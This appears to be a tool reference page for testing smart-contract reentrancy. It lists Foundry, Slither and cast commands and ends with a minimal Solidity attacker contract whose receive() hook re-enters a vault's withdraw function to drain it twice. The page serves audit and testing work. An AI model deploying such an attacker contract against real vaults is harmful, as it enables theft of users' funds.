# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`reentrancy-and-call-ordering`](SKILL.md) | Family: **Blockchain**

Flags below are the ones that matter for this technique, not an exhaustive dump. Re-check with `--help` against the installed version before quoting a flag.

## Pinned Engineering Stack

- **Primary SDK / Schema:** Foundry with a hand-written malicious receiver; Solidity's `nonReentrant` guard for the state-changing path.
- **Validation Gate:** a test that demonstrates the duplicate effect, not just the ability to re-enter.
- Guard state, not just functions: a view that reads live balances is unprotected even when every mutating function is guarded.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `forge` | `forge test --match-test testReentrancy -vvv` | Run the malicious-receiver test with a trace | Cross-platform |
| `slither` | `slither . --detect reentrancy-eth,reentrancy-no-eth` | Triage for call-before-write shapes | Cross-platform |
| `cast` | `cast call $VAULT 'pricePerShare()(uint256)'` | Read the view a third party would trust | Cross-platform |

## Minimal Script Shape

Smallest shape that matches the current API and stays read-only by default.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault { function withdraw(uint256) external; }

contract Reenter {
    IVault vault;
    uint256 public count;

    constructor(IVault v) payable { vault = v; }

    function attack() external { vault.withdraw(1 ether); }

    receive() external payable {
        count += 1;
        if (count < 2) vault.withdraw(1 ether);
    }
}
```
